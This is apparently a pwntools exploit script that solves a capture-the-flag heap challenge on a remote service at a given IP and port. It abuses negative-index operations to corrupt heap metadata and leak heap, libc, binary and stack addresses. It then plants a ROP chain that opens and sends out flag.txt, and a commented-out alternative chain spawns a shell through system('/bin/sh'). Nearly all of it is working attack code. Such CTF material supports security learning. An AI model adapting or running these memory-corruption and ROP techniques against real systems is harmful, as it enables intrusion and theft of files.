from pwn import *


elf = context.binary = ELF("chall")
libc = elf.libc

def create_rand():
    p.sendlineafter("choice:","1")
    p.sendlineafter("choice:","1")
def create_fixed():
    p.sendlineafter("choice:","1")
    p.sendlineafter("choice:","2")
def create_dynamic():
    p.sendlineafter("choice:","1")
    p.sendlineafter("choice:","3")
def list():
    p.sendlineafter("choice:","2")
def set_content(idx,data):
    p.sendlineafter("choice:","3")
    p.sendlineafter(":",str(idx))
    p.sendlineafter(":",data)

def set_content_rand(idx):
    p.sendlineafter("choice:","3")
    p.sendlineafter(":",str(idx))
def display(idx):
    p.sendlineafter("choice:","4")
    p.sendlineafter(":",str(idx))
def delete(idx):
    p.sendlineafter("choice:","5")
    p.sendlineafter(":",str(idx))


# p = process()
p = remote("34.45.81.67", 16001)


# create_dynamic()
# create_rand()
# create_fixed()

# set_content(0,b"A" * 8)
# set_content_rand(1)
# set_content(2,b"#" * 8)
# list()


create_dynamic()
create_dynamic()
set_content(1,b"A" * 0x100)
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()
create_dynamic()


create_dynamic()
set_content(15,b"A" * 0x2000)
create_dynamic()

# gdb.attach(p)
# p.interactive()
# exit()



delete(-2)
delete(-3)
set_content(14,p64(0x8000))
set_content(14,"")
delete(-4)

list()
display(13)
p.recvuntil(": ")
leaks = p.recvline()
heap_leak = u64(leaks[0:8])
print("heap_leak",hex(heap_leak))
print("your fake obj in",hex(heap_leak + 0x390 - 0x10))



libc_leak = u64(leaks[233 * 8:234 * 8 ].ljust(8,b"\x00"))
print("libc_leak",hex(libc_leak))
libc.address = libc_leak - 0x203b20
print("libc.address",hex(libc.address))


dym_note = u64(leaks[37 * 8:38 * 8 ].ljust(8,b"\x00"))
print("dym_note",hex(dym_note))
elf.address = dym_note - 0x8ca0
print("elf.address",hex(elf.address))


set_content(-2,flat([
    heap_leak + 0x390,
    b"A" * 8,
    dym_note,
    libc.sym.environ,
    0x400,
]).ljust(0x100,b"#"))






# for i in range(0x400):
    # try:
        # print(i,hex(u64(leaks[i * 8: (i + 1) * 8])))
    # except:
        # print(i,leaks[i * 8: (i + 1) * 8])


# delete(-0x92)
# delete(-2)
display(-0x92)

p.recvuntil(": ")
leaks = p.recvline()
stack_leak = u64(leaks[0:8])
print("stack_leak",hex(stack_leak))

ret = stack_leak - 0x1e0
set_content(-2,flat([
    heap_leak + 0x390,
    b"A" * 8,
    dym_note,
    ret - 16,
    0x400,
]).ljust(0x100,b"#"))



def pop_rdx(val):
    return flat([
        libc.address + 0x00000000000586e4 , val, #: pop rbx ; ret
        libc.address + 0x00000000000b0133, 0, 0 , 0 # mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret
    ])


syscall = libc.address + 0x13a1bb
rop = ROP(libc)

print(hex(rop.rdi.address))
print(hex(rop.rsi.address))
print(hex(rop.rdx.address))
print(hex(rop.rax.address))

pop_rsi_r15 = libc.address + 0x000000000010f759 #: pop rsi ; pop r15 ; ret

# gdb.attach(p,f"b *{pop_rsi_r15}")
set_content(-0x92,(flat([
    b"flag.txt".ljust(16,b"\x00"),
    pop_rsi_r15, 0,0,
    rop.rdi.address, stack_leak - 0x1e8 - 8,
    pop_rdx(0o777),
    rop.rax.address, 0x2,
    syscall,


    rop.rdi.address, 1,
    pop_rsi_r15, 3,0,
    pop_rdx(0),
    rop.rax.address, 0x28,
    syscall

    # libc.address + 0x000000000002882f,
    # libc.address + 0x000000000010f75b,
    # next(libc.search(b"/bin/sh\x00")),
    # libc.sym.system
])).ljust(0x400,b"#"))



# create_dynamic()
# create_dynamic()
# create_dynamic()
# create_dynamic()
# create_dynamic()

# gdb.attach(p,"b *main+1260")
# delete(-0x18)
# create_dynamic()




p.interactive()